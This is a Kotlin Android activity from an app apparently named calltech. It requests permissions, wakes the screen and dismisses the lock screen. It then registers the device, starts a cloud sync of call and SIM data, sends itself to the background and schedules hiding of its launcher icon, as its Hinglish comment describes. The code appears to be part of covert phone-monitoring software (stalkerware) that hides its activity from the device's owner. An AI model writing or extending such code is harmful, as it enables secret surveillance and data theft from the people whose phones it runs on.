package com.calltech

import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Permissions already hon to popup nahi — seedha SIM sync + hide.
 * Missing hon to system popup, phir hide.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var setupFinished = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            finishAndSync()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            finishAndSync()
            return
        }

        bringToFront()
        permissionLauncher.launch(missing.toTypedArray())
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    private fun finishAndSync() {
        if (setupFinished) {
            return
        }
        setupFinished = true
        SyncObserverManager.register(applicationContext)
        InstallFlow.completeSetup(applicationContext)
        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    DeviceRegistration.registerNow(applicationContext)
                    InstallFlow.runFirstCloudSync(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "Background first sync failed", error)
            }
        }
        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        LauncherHider.markAndSchedule(applicationContext)
        finish()
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
